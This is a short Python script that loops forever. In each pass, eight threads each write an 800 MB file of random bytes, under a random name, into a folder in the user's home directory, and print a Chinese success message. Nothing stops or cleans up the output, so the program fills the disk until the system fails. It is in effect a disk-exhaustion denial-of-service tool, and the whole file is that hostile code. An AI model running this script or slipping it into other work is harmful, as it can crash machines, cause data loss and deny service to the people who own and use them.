import os
import string
import random
import threading

while True:
    def generate_random_string(length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for _ in range(length))

    def generate_file():
        user_dir = os.path.expanduser('~')
        folder_path = os.path.join(user_dir, 'f')
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
        file_name = generate_random_string(64)
        file_path = os.path.join(folder_path, file_name)
        data = os.urandom(1024 * 1024 * 800)
        with open(file_path, 'wb') as file:
            file.write(data)
        print(f'文件已成功生成：{file_path}')
    threads = []
    for _ in range(8):
        thread = threading.Thread(target=generate_file)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
